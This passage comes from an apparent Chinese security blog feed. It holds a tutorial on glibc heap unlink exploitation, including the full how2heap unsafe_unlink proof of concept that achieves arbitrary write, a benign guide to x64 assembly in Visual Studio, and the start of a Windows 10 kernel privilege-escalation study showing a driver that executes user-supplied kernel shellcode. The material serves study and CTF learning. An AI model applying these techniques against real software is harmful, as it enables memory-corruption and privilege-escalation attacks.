<p>看到第三条，想必很多人都会有一个跟我一样的疑问。FD指向的位置，也就是（addr-3<em>4）这个地址的位置并不是一个堆块的起始地址，那么它怎么会有bk指针呢？ *</em>其实在汇编中，根本没有结构体的概念，所有的一切都是偏移，要找FD的bk，其实就是就是找距离FD指针指向的地址的三个字的偏移的地方，所以访问的地址是(FD+3*4)**</p>
<p>这样我们就可以实现在任意可写地址addr中写入except value这样一个值了。但是还需要注意:<strong>expect value +8 地址具有可写的权限，不会导致程序崩溃</strong>，这样就产生了一个任意地址写的漏洞。</p>
<h4 id="0x4-加了防护机制的unlink"><a href="#0x4-加了防护机制的unlink" class="headerlink" title="0x4 加了防护机制的unlink"></a>0x4 加了防护机制的unlink</h4><p>unlink其实是libc中malloc.c文件中的一个宏定义，代码如下(P代表当前堆块，FD代表下一个堆块,BK代表前一个堆块)：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD) &#123;                                            \</span></span><br><span class="line">    FD = P-&gt;fd;                                                          \</span><br><span class="line">    BK = P-&gt;bk;                                                          \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P); \</span><br><span class="line">    <span class="keyword">else</span> &#123;                                                               \</span><br><span class="line">      FD-&gt;bk = BK;                                                       \</span><br><span class="line">      BK-&gt;fd = FD;                                                       \</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (P-&gt;<span class="built_in">size</span>)				       \</span><br><span class="line">      &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;	       \</span><br><span class="line">        assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);		       \</span><br><span class="line">        assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P);		       \</span><br><span class="line">        <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				       \</span><br><span class="line">      <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				       \</span><br><span class="line">        FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		       \</span><br><span class="line">      <span class="keyword">else</span> &#123;							       \</span><br><span class="line">        FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			       \</span><br><span class="line">        FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			       \</span><br><span class="line">        P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			       \</span><br><span class="line">        P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			       \</span><br><span class="line">      &#125;							       \</span><br><span class="line">        &#125;	<span class="keyword">else</span> &#123;							       \</span><br><span class="line">      P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		       \</span><br><span class="line">      P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		       \</span><br><span class="line">        &#125;								       \</span><br><span class="line">      &#125;								       \</span><br><span class="line">    &#125;                                                                    \</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到添加了如下的防护机制：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line"> <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P); \</span><br><span class="line">    <span class="keyword">else</span> &#123;                                                               \</span><br><span class="line">      FD-&gt;bk = BK;                                                       \</span><br><span class="line">      BK-&gt;fd = FD;                                                       \</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (P-&gt;<span class="built_in">size</span>)				       \</span><br><span class="line">      &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;	       \</span><br><span class="line">        assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P);		       \</span><br><span class="line">        assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P);</span><br></pre></td></tr></table></figure>

<p>需要满足做到如下两点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk=P</span><br><span class="line">P-&gt;bk-&gt;fd=P</span><br></pre></td></tr></table></figure>

<p>在看我们在0x3里面选的addr和except value，我们需要构造两个巧妙的值，才能绕过上面的防护。</p>
<p>但是addr和except value该怎么取呢？不妨就让他们相等，列出一个等式(注意下面不是赋值，是等式)，求解</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk =*（addr<span class="number">-3</span>*<span class="number">4</span>+<span class="number">3</span>*<span class="number">4</span>）=P    ==&gt;  addr = &amp;P </span><br><span class="line">P-&gt;bk-&gt;fd = *(except value + <span class="number">2</span>*<span class="number">4</span>) = P =&gt; except value = &amp;P<span class="number">-2</span>*<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>*<em>所以当我们把fd内容设置为(&amp;P-3\</em>4)，把bk的内容设置为（&amp;P-2*4）的时候，就可以绕过这个安全检测机制 **。</p>
<p>接下里就是修改指针的内容了：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p-&gt;fd-&gt;bk = p-&gt;bk</span><br><span class="line">p-&gt;bk-&gt;fd = p-&gt;fd</span><br><span class="line"></span><br><span class="line">因为 p-&gt;fd-&gt;bk=P-&gt;bk-&gt;fd = P</span><br><span class="line">所以最后 P=&amp;P<span class="number">-3</span>*<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>也就是说，P指针本来是指向堆空间的，但是他现在它指向了比它地址小12的地方。假如说P指针是一个全局变量，是存在bss段的，那么我们就可以通过修改bss段的P指针实现对任意地址的读和写。</p>
<h4 id="0x5-分析unsafe-unlink的代码，理解unlink漏洞"><a href="#0x5-分析unsafe-unlink的代码，理解unlink漏洞" class="headerlink" title="0x5 分析unsafe unlink的代码，理解unlink漏洞"></a>0x5 分析unsafe unlink的代码，理解unlink漏洞</h4><p>unsafe unlinke的代码在这里：<a href="https://github.com/Escapingbug/how2heap/blob/master/unsafe_unlink.c" target="_blank" rel="noopener">https://github.com/Escapingbug/how2heap/blob/master/unsafe_unlink.c</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Tested in Ubuntu 14.04/16.04 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">	<span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line">	chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We setup the 'next_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) != False\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Fake chunk bk: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n"</span>);</span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n"</span>,(<span class="keyword">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n"</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n"</span>);</span><br><span class="line">	<span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1.申请两个大小为0x80的堆块:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br></pre></td></tr></table></figure>


<p>2.在chunk0中构建一个伪的堆块，以chunk0_ptr为起始地址</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>   <img src="http://pic.wonderkun.cc/uploads/2017/12/4.png" alt="http://pic.wonderkun.cc/uploads/2017/12/4.png"></p>
<p>3.修改chunk1的pre_chunk_size字段和size字段，以便于在free(chunk1)的时候，可以合并上面构造的那个伪块</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">header_size = <span class="number">2</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">chunk1_hdr[<span class="number">0</span>] = malloc_size; <span class="comment">//上一个堆块的大小，就是伪块的大小</span></span><br><span class="line">chunk1_hdr[<span class="number">1</span>]&amp;=~<span class="number">1</span>;  <span class="comment">//末位清零，最后一位为零表示上一个堆块是free状态，可以和它合并</span></span><br></pre></td></tr></table></figure>

<p>   <img src="http://pic.wonderkun.cc/uploads/2017/12/5.png" alt="http://pic.wonderkun.cc/uploads/2017/12/5.png"></p>
<p>   最后完整的布局图如下：</p>
<p>   <img src="http://pic.wonderkun.cc/uploads/2017/12/6.png" alt="http://pic.wonderkun.cc/uploads/2017/12/6.png"><br> 4.在free(chunk1_ptr)之后，chunk0_ptr指向了&amp;chunk0_ptr-3的地方</p>
<p>   <img src="http://pic.wonderkun.cc/uploads/2017/12/7.png" alt="http://pic.wonderkun.cc/uploads/2017/12/7.png"></p>
<p>5.漏洞证明</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string <span class="comment">//其实就是chunk0_ptr[3] = &amp;victim_string </span></span><br><span class="line">chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"New Value: %s\n"</span>,victim_string);</span><br></pre></td></tr></table></figure>

<p>修改chunk0_ptr[3]的值其实是在修改chunk0_ptr[3]指向的位置，让它指向vimtim_string.</p>
<p>然后修改chunk0_ptr[0]就修改了vimtim_string字符串本身。</p>
<p>也就是说我们通过修改chunk0_ptr[3]的值为我们想要修改的地址，就可以实现任意地址读写操作。</p>
]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>binary</tag>
        <tag>pwn</tag>
        <tag>unlink</tag>
      </tags>
  </entry>
  <entry>
    <title>visual studio 2015上写x64位汇编</title>
    <url>/2019/03/11/visual%20studio%202015%E4%B8%8A%E5%86%99x64%E4%BD%8D%E6%B1%87%E7%BC%96/</url>
    <content><![CDATA[<p>最近在做一个东西，有少部分的代码需要用汇编写，大部分都是c语言实现，而且还是x64的程序。配置单独的masm开发环境，独立编译然后链接过来，真实太费劲了，所以就想直接用visual studio吧。<br>vs上64位的编译器不支持内敛汇编了，只能写成单独的asm文件，然后独立编译。下面就介绍怎么让让vs2015上让项目支持对asm文件进行编译。</p>
<a id="more"></a>

<h3 id="x01-配置项目"><a href="#x01-配置项目" class="headerlink" title="x01 配置项目"></a>x01 配置项目</h3><p>在项目上右键-&gt;生成依赖项-&gt;生成自定义</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/03/1552291498048.png" alt="http://pic.wonderkun.cc/uploads/2019/03/1552291498048.png"></p>
<p>然后勾选，masm选项：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2019/03/1552291644812.png" alt="http://pic.wonderkun.cc/uploads/2019/03/1552291644812.png"></p>
<p>然后接下来就可以在项目的源文件中添加asm文件。</p>
<p>右键源代码-&gt;添加-&gt;添加新建项-&gt;文件后缀修改为asm。</p>
<h3 id="x02-在汇编中调用C函数和变量"><a href="#x02-在汇编中调用C函数和变量" class="headerlink" title="x02 在汇编中调用C函数和变量"></a>x02 在汇编中调用C函数和变量</h3><p>比如我们的<code>main.c</code>中定义了一个函数，</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"this is my function\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>想要在汇编中调用，首先需要在项目头文件<code>stdafx.h</code>头文件中写如下的声明:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span><span class="comment">//防止函数被name mangling</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">	__int64 g_iValue = <span class="number">100</span>; <span class="comment">// 定义一个全局变量，注意用extern语法的时候声明和定义的区别。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里用C的方式导出，防止函数名字被粉碎。</p>
<p>接下来，就需要在汇编中写代码来调用c中定义的函数和c中全局变量了。在<code>proc.asm</code>写如下代码</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="meta">EXTERN</span>  myprint:PROC  <span class="comment">;引用外部函数</span></span><br><span class="line"><span class="meta">EXTERN</span>  g_iValue:<span class="built_in">DQ</span>   <span class="comment">;引用外部变量，dq是QWORD，8字节的变量</span></span><br><span class="line"></span><br><span class="line"><span class="meta">.DATA</span></span><br><span class="line">val1 <span class="built_in">DQ</span> ?<span class="comment">;自己定义变量</span></span><br><span class="line"></span><br><span class="line"><span class="meta">.CODE</span></span><br><span class="line"></span><br><span class="line">func2 PROC</span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">rsp</span>,<span class="number">28h</span>  <span class="comment">; 这个地方可能是为了栈空间对齐，不这样做有可能会崩掉，原因未知。反正反汇编一x64的代码都有这个东西</span></span><br><span class="line">	<span class="keyword">call</span> myprint</span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">r10</span>,g_iValue <span class="comment">; 此处使用中的stdafx.h全局变量。</span></span><br><span class="line">    <span class="keyword">mov</span> val1,<span class="built_in">r10</span>  <span class="comment">; 使用自定义的变量</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,val1 <span class="comment">; 写入返回值</span></span><br><span class="line">	<span class="keyword">add</span> <span class="built_in">rsp</span>,<span class="number">28h</span></span><br><span class="line">	<span class="keyword">ret</span></span><br><span class="line">FUNC2 ENDP</span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<p>这样就可以实现在汇编中调用C的函数了。</p>
<h3 id="0x3-在C语言中调用汇编的函数"><a href="#0x3-在C语言中调用汇编的函数" class="headerlink" title="0x3 在C语言中调用汇编的函数"></a>0x3 在C语言中调用汇编的函数</h3><p>上面代码写完之后，编译可以通过，但是我们并看不到执行的结果，因为汇编中的<code>func2</code>还并没有被我们调用，想要调用汇编中的<code>func2</code>，首先需要在头文件<code>stdafx.h</code>中做如下声明：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function">__int64 __stdcall <span class="title">func2</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>然后在main函数中调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    __int64 ret = func2();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%ld"</span>,ret);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就可以看到输出：</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">this <span class="keyword">is</span> my <span class="keyword">function</span></span><br><span class="line"><span class="number">100</span></span><br></pre></td></tr></table></figure>

<h3 id="0x4-在汇编中调用win64-api"><a href="#0x4-在汇编中调用win64-api" class="headerlink" title="0x4 在汇编中调用win64 api"></a>0x4 在汇编中调用win64 api</h3><p>有时候需要在汇编中调用windows的64位的API，在调用API之前首先要明白函数调用约定。</p>
<p>在32位系统中我们调用的用户态API一般都遵循<code>WINAPI(__stdcall)</code>的调用约定,主要规则有两条: 1.  函数参数由右向左入栈;2. 函数调用结束后由被调用函数清除栈内数据（其实是被调者参数的清除）。所以在调用一个遵循<code>WINAPI</code>的函数之后，不需要自己来做被调函数栈空间的清除，因为被调函数已经恢复过了。而在x64汇编中，两方面都发生了变化。一是前四个参数分析通过四个寄存器传递：RCX、RDX、R8、R9，如果还有更多的参数，才通过椎栈传递。二是调用者负责椎栈空间的分配与回收。</p>
<p>下面写一个调用<code>MeesageBoxA</code>的实例代码：</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">INCLUDELIB kernel32<span class="number">.</span>lib <span class="comment">; 告诉连接器链接这个动态库</span></span><br><span class="line"><span class="meta">EXTERN</span> MessageBoxA:PROC  <span class="comment">; 引用 MessageBoxA函数</span></span><br><span class="line"></span><br><span class="line"><span class="meta">.DATA</span></span><br><span class="line"><span class="comment">; 定义局部变量</span></span><br><span class="line">szCaption   <span class="built_in">db</span>  <span class="string">'恭喜'</span>,<span class="number">0</span>  </span><br><span class="line">szText      <span class="built_in">db</span>  <span class="string">'当您看到这个信息的时候，您已经可以编译Win32汇编程序了!'</span>,<span class="number">0</span>  </span><br><span class="line"></span><br><span class="line"><span class="meta">.CODE</span></span><br><span class="line">func2 PROC</span><br><span class="line">    <span class="keyword">sub</span> <span class="built_in">rsp</span>,<span class="number">28h</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rcx</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>, offset szText<span class="comment">;</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">r8</span>, offset szCaption</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r9</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">call</span> MessageBoxA </span><br><span class="line">	<span class="keyword">add</span> <span class="built_in">rsp</span>,<span class="number">28h</span>  </span><br><span class="line">	<span class="keyword">ret</span></span><br><span class="line">FUNC2 ENDP</span><br><span class="line">END</span><br></pre></td></tr></table></figure>

<p>看雪上的大佬说<code>sub rsp,28h</code>是为了给被调用函数的参数和返回地址预留栈空间，这个说法应该是对的，不留会报错的。</p>
<p>至于语法高亮，可以使用<code>AsmDude</code>这个插件，还有代码提示功能，用起来很舒服。</p>
<h3 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h3><p><a href="https://www.cs.uaf.edu/2017/fall/cs301/reference/x86_64.html" target="_blank" rel="noopener">https://www.cs.uaf.edu/2017/fall/cs301/reference/x86_64.html</a></p>
<p><a href="https://bbs.pediy.com/thread-43967.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-43967.htm</a></p>
]]></content>
      <categories>
        <category>代码控</category>
      </categories>
      <tags>
        <tag>binary</tag>
        <tag>vs2015</tag>
        <tag>asm</tag>
      </tags>
  </entry>
  <entry>
    <title>windows10内核态提权方法汇总</title>
    <url>/2021/08/22/windows10%E5%86%85%E6%A0%B8%E6%80%81%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期由于某些项目的原因，突然激发了我对windows内核提权原理的兴趣。于是就想研究一下，在拿到一个内核态任意代码执行漏洞后，到底有多少种方法常用的方法还能在windows 10上成功提权，针对这些不同的提权方法到底有没有一个比较通用的拦截方案？ 所以就有了如下这篇学习记录。</p>
<p>不同于ring3层的shellcode那样功能多样化，在的漏洞利用过程中，ring0层的shellcode通常用来获取 <code>nt authority\system</code>权限，本文基于的前提是已经有一个内核态任意代码执行漏洞的前提下，学习三种还能够在windows 10 上成功提权的方法，并写出相对应的shellcode。 </p>
<a id="more"></a>
<h2 id="环境的准备"><a href="#环境的准备" class="headerlink" title="环境的准备"></a>环境的准备</h2><p>为了进行内核态的shellcode测试，那首先就需要先有一个内核态的任意代码执行漏洞。最简单的思路就是写一个驱动，它能够从用户态读取shellcode过来，然后在内核中当作代码执行。非常幸运的这样的代码fireeye已经帮我们实现了<a href="https://github.com/fireeye/flare-kscldr" target="_blank" rel="noopener">https://github.com/fireeye/flare-kscldr</a>,只需要下载编译就可以使用。</p>
<p>不过在使用之前我们还是简单的看一下<code>flare-kscldr</code> 的代码逻辑，帮助我们理解。</p>
<p>驱动中主要实现了如下两个irp请求的响应函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = scldrWrite;</span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = scldrDeviceControl;</span><br></pre></td></tr></table></figure>

<p><code>IRP_MJ_WRITE</code>主要响应写请求，实现从用户态将shellcode写入驱动的设备扩展。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">NTSTATUS</span><br><span class="line">scldrWrite(</span><br><span class="line">    __inout PDEVICE_OBJECT DeviceObject,</span><br><span class="line">    __inout PIRP Irp</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS nts = STATUS_UNSUCCESSFUL;</span><br><span class="line">    ULONG len = <span class="number">0</span>;</span><br><span class="line">    PVOID src = <span class="literal">NULL</span>;</span><br><span class="line">    PIO_STACK_LOCATION io_stack = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ScldrDevExt</span> *<span class="title">dev_ext</span> = <span class="title">NULL</span>;</span></span><br><span class="line">    BOOLEAN took_mutex = FALSE;</span><br><span class="line"></span><br><span class="line">    ASSERT(KeGetCurrentIrql() &lt;= APC_LEVEL);</span><br><span class="line"></span><br><span class="line">    io_stack = IoGetCurrentIrpStackLocation(Irp);</span><br><span class="line"></span><br><span class="line">    len = io_stack-&gt;Parameters.Write.Length;</span><br><span class="line"></span><br><span class="line">    PDEBUG(<span class="string">"scldrWrite(%d)\n"</span>, len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Assume failure</span></span><br><span class="line">    Irp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    dev_ext = (struct ScldrDevExt *)DeviceObject-&gt;DeviceExtension;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == dev_ext)</span><br><span class="line">    &#123;</span><br><span class="line">        len = <span class="number">0</span>;</span><br><span class="line">        nts = STATUS_INVALID_DEVICE_STATE;</span><br><span class="line">        <span class="keyword">goto</span> exit_scldrWrite;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ExAcquireFastMutex(&amp;dev_ext-&gt;mutex);</span><br><span class="line">    took_mutex = TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &gt; dev_ext-&gt;max_len)</span><br><span class="line">    &#123;</span><br><span class="line">        nts = STATUS_BUFFER_OVERFLOW;</span><br><span class="line">        len = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!len)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (dev_ext-&gt;buf)</span><br><span class="line">            &#123;</span><br><span class="line">                ExFreePoolWithTag(dev_ext-&gt;buf, TAG);</span><br><span class="line">                dev_ext-&gt;buf = <span class="literal">NULL</span>;</span><br><span class="line">                dev_ext-&gt;len = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            src = Irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">            nts = scldrDevExtSetBufUnsafe(dev_ext, (PUCHAR)src, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 